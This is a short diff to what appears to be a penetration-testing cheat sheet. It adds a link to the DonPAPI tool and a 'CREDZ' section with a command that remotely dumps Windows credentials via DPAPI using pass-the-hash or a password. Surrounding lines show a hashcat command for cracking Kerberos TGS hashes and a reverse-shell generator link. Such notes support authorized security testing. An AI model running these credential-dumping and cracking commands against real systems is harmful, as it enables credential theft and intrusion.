@@ -11,6 +11,7 @@ Useful links
 - Reverse Shells : <https://www.revshells.com>
 - Windows / AD : <https://wadcoms.github.io/>
 - OSINT : <https://www.couverture-mobile.fr/>
+- Windows (Creds) : https://github.com/login-securite/DonPAPI
 
 ## Network Enumeration
 
@@ -94,6 +95,14 @@ KERBEROS
 
 # Crack TGS
 - hashcat -m 13100 -a 0 tgs.hash /usr/share/wordlists/rockyou.txt --force
+ 
+```
+
+``markdown
+CREDZ
+
+# Dump credz remotely with DPAPI Key (account should be a local admin account)
+- python3 DonPAPI.py --hashes <LM>:<NT> domain/user@target OR DonPAPI.py domain/user:passw0rd@target
  
 ```
 
